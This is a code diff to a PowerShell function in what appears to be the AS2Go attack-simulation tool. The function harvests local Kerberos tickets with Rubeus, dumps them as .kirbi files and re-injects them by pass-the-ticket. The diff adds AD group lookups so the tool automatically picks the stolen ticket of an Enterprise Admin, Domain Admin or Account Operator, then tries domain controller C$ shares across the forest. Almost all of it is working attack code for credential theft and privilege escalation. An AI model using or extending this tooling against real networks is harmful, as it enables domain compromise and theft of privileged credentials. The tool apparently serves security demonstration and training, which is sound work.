@@ -4,8 +4,11 @@ Harvests and reuses Kerberos tickets on the local machine in the AS2Go Pass-the-
 
 .DESCRIPTION
 Harvests tickets on the machine running AS2Go with Rubeus instead of Mimikatz. Nothing leaves this machine.
-Analyzes Rubeus triage output, summarizes available accounts, and recommends an account with a TGT and service ticket.
-Allows another candidate, dumps its tickets with Rubeus as .kirbi files, and injects them back with Rubeus ptt.
+Analyzes Rubeus triage output, resolves each candidate's AD group membership via its own domain, and
+recommends an account that holds a TGT and membership in a high-value privileged group (Enterprise Admins,
+Domain Admins, or Account Operators), since the goal is to be able to make a change in AD, not merely to
+hold any service ticket. Allows another candidate, dumps its tickets with Rubeus as .kirbi files, and
+injects them back with Rubeus ptt.
 Displays cached tickets and attempts to enumerate DC C$ shares across forest domains using the resulting context.
 
 .EXAMPLE
@@ -28,8 +31,9 @@ Category: Main Function
 
 .FUNCTIONALITY
 Harvests Kerberos tickets on the local machine with Rubeus triage and dump instead of Mimikatz.
-Reviews available ticket identities, injects a selected TGT back with Rubeus ptt, and inspects cached tickets
-after injection. Attempts to list domain controller admin shares across the forest.
+Resolves candidate accounts' AD group membership to recommend one that can make a change in AD,
+injects its TGT back with Rubeus ptt, and inspects cached tickets after injection. Attempts to list
+domain controller admin shares across the forest.
 #>
 function Invoke-PassTheTicketAttackLocalMachine {
 
@@ -113,12 +117,29 @@ function Invoke-PassTheTicketAttackLocalMachine {
     # Parse triage output; supports the pipe table and the legacy block format.
     # Same user name can appear in several logon sessions; merge them so the
     # candidate menu shows one entry per user and the dump uses the best session.
+    # Resolve each candidate's AD group membership via its own Domain (queried as -Server,
+    # same pattern as Invoke-OverPassTheHashAttack) so RID 519/512/548 membership - not just
+    # "has a TGT and a service ticket" - can identify who can actually make a change in AD.
     $BestResults = Get-RubeusTriageSessions -TriageOutput $triageText |
     Group-Object UserName |
     ForEach-Object {
-        # Prefer sessions that offer both a TGT and a service ticket.
-        $sessions = @($_.Group | Sort-Object @{ Expression = { [bool]$_.TGTSpn -and [bool]$_.ServiceSpn }; Descending = $true })
+        # Prefer sessions that offer both a TGT and a service ticket; on a tie, prefer the
+        # longest-still-valid TGT.
+        $sessions = @($_.Group | Sort-Object @{ Expression = { [bool]$_.TGTSpn -and [bool]$_.ServiceSpn }; Descending = $true }, @{ Expression = 'TGTEndTime'; Descending = $true })
         $sessions[0]
+    } |
+    ForEach-Object {
+        # Resolved for every candidate with a known domain, not only ones with a usable TGT,
+        # so the table still shows a privileged account's group membership even when its only
+        # cached ticket is a cross-realm referral and it cannot currently be selected.
+        $membership = @()
+        If ($_.Domain) {
+            $membership = @(Get-ADPrincipalGroupMembership -Identity $_.UserName -Server $_.Domain -ErrorAction SilentlyContinue |
+                Select-Object -Property Name, SID)
+        }
+        $_ | Select-Object *,
+        @{ Name = 'GroupMembership'; Expression = { ($membership | ForEach-Object { $_.Name }) -join ', ' } },
+        @{ Name = 'GroupMembershipRids'; Expression = { ($membership | ForEach-Object { $_.SID.Value.Split('-')[-1] }) -join ', ' } }
     }
 
     If ($BestResults.Count -gt 0) {
@@ -134,20 +155,42 @@ function Invoke-PassTheTicketAttackLocalMachine {
         return
     }
 
-    $BestResults | Format-Table LUID, UserName, TGTSpn, ServiceSpn -AutoSize | out-host
+    $BestResults | Format-Table LUID, UserName, TGTSpn, CrossRealmTGTSpn, ServiceSpn, GroupMembershipRids -AutoSize | out-host
 
-    $bestLocalUser = $BestResults |
-    Where-Object { $_.TGTSpn -and $_.ServiceSpn } |
-    Select-Object -First 1
+    # Best candidate: a TGT is mandatory (nothing to dump/inject without one). Among
+    # qualifying candidates, prefer membership in the highest-value privileged group
+    # (519 Enterprise Admins, 512 Domain Admins, 548 Account Operators - same RID
+    # priority as Invoke-OverPassTheHashAttack), since the point is to be able to make
+    # a change in AD, not merely to hold any service ticket. Within the same RID tier,
+    # prefer a candidate that already has a usable service ticket, then the longest-still-valid TGT.
+    $bestLocalUser = $null
+    foreach ($Rid in 519, 512, 548) {
+        $bestLocalUser = $BestResults |
+        Where-Object { $_.TGTSpn -and $_.GroupMembershipRids -match "(?<!\d)$Rid(?!\d)" } |
+        Sort-Object @{ Expression = { [bool]$_.ServiceSpn }; Descending = $true }, @{ Expression = 'TGTEndTime'; Descending = $true } |
+        Select-Object -First 1
+        If ($bestLocalUser) { break }
+    }
 
+    # No high-value RID match: fall back to the previous heuristic (TGT + service ticket).
+    If (-not $bestLocalUser) {
+        $bestLocalUser = $BestResults |
+        Where-Object { $_.TGTSpn -and $_.ServiceSpn } |
+        Sort-Object @{ Expression = 'TGTEndTime'; Descending = $true } |
+        Select-Object -First 1
+    }
 
-    $options = @(New-HelpOptions -InputObject $BestResults -Label 'UserName' -Help 'ServiceSpn' -Value "UserName" -AddSkip)
+    If (-not $bestLocalUser) {
+        $bestLocalUser = $BestResults | Where-Object { $_.TGTSpn } | Select-Object -First 1
+    }
+
+    $options = @(New-HelpOptions -InputObject $BestResults -Label 'UserName' -Help 'GroupMembershipRids' -Value "UserName" -AddSkip)
     $candidate = $bestLocalUser.UserName
     $index = [array]::IndexOf($BestResults.UserName, $candidate)
 
-    
+
     If (-not $candidate) { $candidate = $BestResults[0].UserName }
-    Write-AS2GoOutput -Type Textmaker -Message "Because both a TGT and a service ticket were present,`n      the primary Pass-the-Ticket candidate was identified as:" -TM $candidate
+    Write-AS2GoOutput -Type Textmaker -Message "Based on privileged group membership and ticket availability,`n      the primary Pass-the-Ticket candidate was identified as:" -TM $candidate
 
     $title = "Confirm or change the account whose tickets will be dumped"
     $message = ""
